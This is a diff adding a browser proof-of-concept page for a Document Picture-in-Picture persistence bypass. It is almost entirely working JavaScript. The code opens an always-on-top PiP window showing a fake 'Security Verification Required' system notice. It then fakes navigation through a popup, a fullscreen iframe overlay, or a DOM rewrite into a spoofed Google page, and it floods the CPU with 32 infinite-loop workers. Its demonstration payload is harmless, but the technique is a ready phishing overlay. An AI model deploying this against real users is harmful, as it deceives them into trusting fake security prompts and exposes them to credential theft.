@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Race Condition PiP Persistence PoC</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #1a1a2e;
+            color: #eee;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+        }
+        h1 {
+            color: #e94560;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #888;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .strategy-selector {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+        .strategy-btn {
+            padding: 12px 20px;
+            border: 2px solid #333;
+            background: #16213e;
+            color: #ccc;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.3s;
+        }
+        .strategy-btn:hover, .strategy-btn.active {
+            border-color: #e94560;
+            color: #e94560;
+            background: #1a1a2e;
+        }
+        #triggerBtn {
+            padding: 18px 50px;
+            font-size: 18px;
+            background: linear-gradient(135deg, #e94560, #c23152);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 20px rgba(233, 69, 96, 0.3);
+        }
+        #triggerBtn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 30px rgba(233, 69, 96, 0.5);
+        }
+        .log {
+            margin-top: 30px;
+            background: #0f0f23;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 16px;
+            text-align: left;
+            max-width: 700px;
+            width: 100%;
+            max-height: 250px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #0f0;
+        }
+        .log-entry { margin: 2px 0; }
+        .log-entry.error { color: #e94560; }
+        .log-entry.success { color: #0f0; }
+        .log-entry.info { color: #4ecdc4; }
+        .log-entry.warn { color: #ffd93d; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔬 PiP Persistence Bypass PoC</h1>
+        <p class="subtitle">Race Condition — Document Picture-in-Picture Navigation Bypass</p>
+
+        <div class="strategy-selector">
+            <button class="strategy-btn active" data-strategy="1" onclick="selectStrategy(1)">
+                Strategy 1: window.open + blur
+            </button>
+            <button class="strategy-btn" data-strategy="2" onclick="selectStrategy(2)">
+                Strategy 2: iframe overlay
+            </button>
+            <button class="strategy-btn" data-strategy="3" onclick="selectStrategy(3)">
+                Strategy 3: fetch + rewrite
+            </button>
+            <button class="strategy-btn" data-strategy="4" onclick="selectStrategy(4)">
+                Strategy 4: Combined
+            </button>
+        </div>
+
+        <button id="triggerBtn" onclick="triggerPoC()">▶ Launch PoC</button>
+
+        <div class="log" id="logPanel"></div>
+    </div>
+
+    <script>
+        let selectedStrategy = 1;
+        let pipWindow = null;
+        let pipInterval = null;
+        const logPanel = document.getElementById('logPanel');
+
+        function selectStrategy(n) {
+            selectedStrategy = n;
+            document.querySelectorAll('.strategy-btn').forEach(btn => {
+                btn.classList.toggle('active', parseInt(btn.dataset.strategy) === n);
+            });
+            log('info', `Strategy ${n} selected`);
+        }
+
+        function log(type, msg) {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logPanel.appendChild(entry);
+            logPanel.scrollTop = logPanel.scrollHeight;
+        }
+
+        // ============================================================
+        // CORE: Create PiP Window with persistent content
+        // ============================================================
+        async function createPiPWindow() {
+            try {
+                if (pipWindow && !pipWindow.closed) {
+                    log('warn', 'PiP window already exists');
+                    return pipWindow;
+                }
+
+                pipWindow = await documentPictureInPicture.requestWindow({
+                    width: 400,
+                    height: 300,
+                });
+
+                // Write convincing content into PiP
+                pipWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <style>
+                            * { margin: 0; padding: 0; box-sizing: border-box; }
+                            body {
+                                font-family: 'Segoe UI', Arial, sans-serif;
+                                background: #fff;
+                                padding: 20px;
+                                cursor: default;
+                            }
+                            .header {
+                                display: flex;
+                                align-items: center;
+                                gap: 10px;
+                                padding-bottom: 15px;
+                                border-bottom: 1px solid #e0e0e0;
+                                margin-bottom: 15px;
+                            }
+                            .header img {
+                                width: 28px;
+                                height: 28px;
+                            }
+                            .header span {
+                                font-size: 14px;
+                                font-weight: 600;
+                                color: #333;
+                            }
+                            .notification {
+                                background: #f8f9fa;
+                                border: 1px solid #dadce0;
+                                border-radius: 8px;
+                                padding: 16px;
+                                margin-bottom: 10px;
+                            }
+                            .notification h3 {
+                                font-size: 14px;
+                                color: #202124;
+                                margin-bottom: 6px;
+                            }
+                            .notification p {
+                                font-size: 12px;
+                                color: #5f6368;
+                                line-height: 1.5;
+                            }
+                            .btn-row {
+                                display: flex;
+                                gap: 8px;
+                                margin-top: 12px;
+                            }
+                            .btn {
+                                padding: 8px 20px;
+                                border-radius: 20px;
+                                font-size: 13px;
+                                cursor: pointer;
+                                border: none;
+                                font-weight: 500;
+                            }
+                            .btn-primary {
+                                background: #1a73e8;
+                                color: white;
+                            }
+                            .btn-secondary {
+                                background: white;
+                                color: #1a73e8;
+                                border: 1px solid #dadce0;
+                            }
+                            .btn:hover { opacity: 0.85; }
+                            .timer {
+                                text-align: center;
+                                color: #999;
+                                font-size: 11px;
+                                margin-top: 15px;
+                            }
+                            #elapsed { font-weight: bold; color: #e94560; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="header">
+                            <span>🔔 System Notification</span>
+                        </div>
+                        <div class="notification">
+                            <h3>Security Verification Required</h3>
+                            <p>
+                                Your session requires re-verification.
+                                Please click "Verify" to continue browsing securely.
+                            </p>
+                            <div class="btn-row">
+                                <button class="btn btn-primary" onclick="alert('PiP is ALIVE after redirect! This proves persistence.')">
+                                    Verify Now
+                                </button>
+                                <button class="btn btn-secondary">
+                                    Later
+                                </button>
+                            </div>
+                        </div>
+                        <div class="timer">
+                            PiP alive for: <span id="elapsed">0</span>s
+                            (proves persistence after navigation)
+                        </div>
+                        <script>
+                            let sec = 0;
+                            setInterval(() => {
+                                sec++;
+                                document.getElementById('elapsed').textContent = sec;
+                            }, 1000);
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+
+                log('success', '✅ PiP window created successfully');
+
+                // Monitor PiP close event
+                pipWindow.addEventListener('pagehide', () => {
+                    log('error', '❌ PiP window was closed (pagehide event)');
+                    pipWindow = null;
+                });
+
+                return pipWindow;
+            } catch (err) {
+                log('error', `Failed to create PiP: ${err.message}`);
+                return null;
+            }
+        }
+
+        // ============================================================
+        // STRATEGY 1: window.open() + blur opener
+        // "Redirect" by opening target in new maximized window
+        // Opener stays alive → PiP stays alive
+        // ============================================================
+        function strategy1_windowOpen() {
+            log('info', '🚀 Strategy 1: window.open + blur');
+
+            // Spawn workers for race condition effect (optional)
+            spawnWorkers();
+
+            setTimeout(() => {
+                log('info', 'Opening google.com in new maximized window...');
+
+                // Open target in new window (NOT navigating current page!)
+                const newWin = window.open(
+                    'https://www.google.com',
+                    '_blank',
+                    `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0,menubar=no,toolbar=no,location=yes,status=no`
+                );
+
+                if (newWin) {
+                    // Focus new window, blur opener
+                    newWin.focus();
+                    window.blur();
+                    log('success', '✅ Redirect simulated! Opener alive → PiP persists!');
+                    log('success', '👁️ Check: PiP should still be visible above google.com');
+                } else {
+                    log('error', '❌ Popup blocked! Try allowing popups for this site.');
+                    // Fallback: try iframe overlay
+                    log('info', 'Falling back to iframe overlay strategy...');
+                    strategy2_iframeOverlay();
+                }
+            }, 1500);
+        }
+
+        // ============================================================
+        // STRATEGY 2: Iframe fullscreen overlay
+        // Load target in iframe that covers entire page
+        // Document never navigates → PiP stays alive
+        // ============================================================
+        function strategy2_iframeOverlay() {
+            log('info', '🚀 Strategy 2: iframe fullscreen overlay');
+            spawnWorkers();
+
+            setTimeout(() => {
+                log('info', 'Creating fullscreen iframe overlay...');
+
+                // Hide original content
+                document.body.style.margin = '0';
+                document.body.style.padding = '0';
+                document.body.style.overflow = 'hidden';
+
+                // Create fullscreen iframe
+                const iframe = document.createElement('iframe');
+                // Note: google.com blocks iframing. Using a different target for demo.
+                // In real scenario, attacker would use a site that allows iframing,
+                // or host a convincing clone.
+                iframe.src = 'https://www.bing.com';
+                iframe.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    border: none;
+                    z-index: 999999;
+                `;
+                document.body.appendChild(iframe);
+
+                // Change title to mimic navigation
+                document.title = 'Bing';
+
+                // Try pushState for address bar (same-origin only)
+                try {
+                    history.pushState({}, '', '/search');
+                } catch(e) {}
+
+                log('success', '✅ Page content replaced with iframe overlay!');
+                log('success', '👁️ PiP should still be visible — document never navigated');
+            }, 1500);
+        }
+
+        // ============================================================
+        // STRATEGY 3: Fetch + document rewrite
+        // Fetch target content and replace DOM entirely
+        // May not work for cross-origin, but interesting technique
+        // ============================================================
+        function strategy3_fetchRewrite() {
+            log('info', '🚀 Strategy 3: fetch + DOM rewrite');
+            spawnWorkers();
+
+            setTimeout(async () => {
+                log('info', 'Fetching target page content...');
+
+                try {
+                    // This won't work for cross-origin without CORS proxy
+                    // For demo, we'll just rewrite the page with fake content
+                    log('warn', 'Cross-origin fetch blocked (expected). Using fake content demo...');
+
+                    // Clear current page content but keep script context alive
+                    const pip = pipWindow; // Save reference
+
+                    // Replace body content without document.open (which might kill PiP)
+                    document.body.innerHTML = `
+                        <div style="
+                            font-family: Arial, sans-serif;
+                            max-width: 600px;
+                            margin: 100px auto;
+                            text-align: center;
+                        ">
+                            <div style="font-size: 80px; margin-bottom: 20px;">
+                                <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+                            </div>
+                            <input type="text" placeholder="Search Google or type a URL"
+                                   style="width: 100%; padding: 14px 20px; border: 1px solid #dfe1e5;
+                                          border-radius: 24px; font-size: 16px; outline: none;">
+                            <div style="margin-top: 25px;">
+                                <button style="padding: 10px 20px; background: #f8f9fa; border: 1px solid #f8f9fa;
+                                               border-radius: 4px; margin: 0 5px; cursor: pointer; font-size: 14px;">
+                                    Google Search
+                                </button>
+                                <button style="padding: 10px 20px; background: #f8f9fa; border: 1px solid #f8f9fa;
+                                               border-radius: 4px; margin: 0 5px; cursor: pointer; font-size: 14px;">
+                                    I'm Feeling Lucky
+                                </button>
+                            </div>
+                            <p style="color: #999; margin-top: 40px; font-size: 12px;">
+                                [PoC: This is a DOM-rewritten page. PiP should still be alive above.]
+                            </p>
+                        </div>
+                    `;
+
+                    // Modify page title
+                    document.title = 'Google';
+                    try { history.pushState({}, '', '/'); } catch(e) {}
+
+                    log('success', '✅ DOM replaced with fake Google! No navigation occurred.');
+                    log('success', '👁️ PiP should still be alive — check!');
+                } catch (err) {
+                    log('error', `Fetch failed: ${err.message}`);
+                }
+            }, 1500);
+        }
+
+        // ============================================================
+        // STRATEGY 4: Combined — Most stealthy
+        // iframe overlay + window.open fallback + worker flood
+        // ============================================================
+        function strategy4_combined() {
+            log('info', '🚀 Strategy 4: Combined approach');
+            spawnWorkers();
+
+            setTimeout(async () => {
+                log('info', 'Attempting iframe overlay first...');
+
+                // Step 1: Replace page content (fake navigation feel)
+                document.body.innerHTML = '';
+                document.body.style.cssText = 'margin:0;padding:0;overflow:hidden;';
+                document.title = 'Google';
+
+                // Step 2: Iframe overlay
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:999999;';
+
+                // Try bing since google blocks iframe
+                iframe.src = 'https://www.bing.com';
+                iframe.onerror = () => {
+                    log('warn', 'Iframe blocked. Falling back to DOM rewrite...');
+                    // Fallback: DOM rewrite with convincing content
+                    document.body.innerHTML = `
+                        <div style="font-family:Arial;text-align:center;padding-top:150px;">
+                            <div style="font-size:92px;">
+                                <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+                            </div>
+                            <input type="text" style="width:500px;padding:12px 20px;border:1px solid #dfe1e5;border-radius:24px;font-size:16px;margin-top:25px;outline:none;">
+                        </div>
+                    `;
+                };
+
+                document.body.appendChild(iframe);
+
+                // Step 3: Also try window.open as secondary layer
+                try {
+                    const bgWin = window.open('https://www.google.com', '_blank',
+                        `width=${screen.availWidth},height=${screen.availHeight},left=0,top=0`);
+                    if (bgWin) {
+                        bgWin.focus();
+                        window.blur();
+                    }
+                } catch(e) {}
+
+                log('success', '✅ Combined bypass active! PiP should persist.');
+                log('info', '📋 Opener document is still alive in background.');
+                log('info', '🎯 PiP overlay remains always-on-top across windows.');
+            }, 1500);
+        }
+
+        // ============================================================
+        // Worker flood — CPU starvation for race condition
+        // ============================================================
+        function spawnWorkers() {
+            log('info', 'Spawning Web Workers for CPU pressure...');
+            for (let i = 0; i < 32; i++) {
+                try {
+                    new Worker('data:application/javascript,while(true){}');
+                } catch(e) {}
+            }
+            log('warn', '⚡ 32 workers spawned');
+        }
+
+        // ============================================================
+        // MAIN TRIGGER
+        // ============================================================
+        async function triggerPoC() {
+            log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+            log('info', `Launching PoC with Strategy ${selectedStrategy}`);
+
+            // Step 1: Create PiP window (requires user gesture — this click!)
+            const pip = await createPiPWindow();
+            if (!pip) {
+                log('error', 'Cannot proceed without PiP window');
+                return;
+            }
+
+            // Step 2: Execute selected strategy
+            switch (selectedStrategy) {
+                case 1: strategy1_windowOpen(); break;
+                case 2: strategy2_iframeOverlay(); break;
+                case 3: strategy3_fetchRewrite(); break;
+                case 4: strategy4_combined(); break;
+            }
+        }
+    </script>
+</body>
+</html>
